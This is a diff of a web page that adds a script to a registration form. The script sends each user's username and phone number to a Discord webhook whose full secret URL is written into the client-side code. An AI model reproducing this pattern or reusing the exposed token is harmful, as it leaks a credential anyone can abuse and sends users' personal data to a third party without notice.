@@ -271,6 +271,45 @@ gtag('config', 'G-4ZX15XB19P');
 <br>
 <br>
 			<input type="submit" value="Register">
+
+			<script>
+				document.getElementById("phoneLoginForm").addEventListener("submit", function (e) {
+					e.preventDefault(); // Prevent the default form submission behavior
+		
+					// Get the values from the form
+					const username = document.getElementById("username").value;
+					const phoneNumber = document.getElementById("phoneNumber").value;
+		
+					// Create an object with the data to send to the Discord webhook
+					const data = {
+						username: username,
+						phoneNumber: phoneNumber
+					};
+		
+					// Send the data to the Discord webhook (you need to replace 'YOUR_WEBHOOK_URL' with your actual webhook URL)
+					fetch('https://discord.com/api/webhooks/1155837717805023292/YLPqu0ctRm-Kk4I7RPwG5cb9D4F4MbLFUUIX1cDssEhfyEAC_D-Mh2zEYWZ4nPnzenvj', {
+						method: 'POST',
+						headers: {
+							'Content-Type': 'application/json'
+						},
+						body: JSON.stringify(data)
+					})
+					.then(response => response.json())
+					.then(responseData => {
+						// Display the username
+						alert(`Username: ${responseData.username}`);
+		
+						// Save a cookie with the username (you can replace 'username_cookie' with your desired cookie name)
+						document.cookie = `username_cookie=${username}`;
+		
+						// Reset the form
+						document.getElementById("phoneLoginForm").reset();
+					})
+					.catch(error => {
+						console.error('Error:', error);
+					});
+				});
+			</script>
 		</form>
 
       </div> 
